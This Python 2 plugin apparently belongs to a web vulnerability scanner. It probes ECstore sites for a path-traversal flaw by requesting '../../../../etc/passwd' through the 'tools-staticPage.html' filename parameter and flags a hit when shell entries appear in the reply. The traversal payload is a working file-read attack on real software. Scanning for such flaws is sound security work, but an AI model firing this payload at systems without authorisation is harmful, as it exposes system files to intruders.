#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "index.php/tools-staticPage.html?filename=../../../../../../../../../../etc/passwd"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if re.search('/bin/(bash|sh)[^\r\n<>]*[\r\n]', content):
            request = getRequest(url)
            response = getResponse(res)
            if ob['isstart']=='1':
                detail="验证性扫描结果：\n%s\n%s"%(content,detail)            
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:ECstoreReadFileScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ECstoreReadFileScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def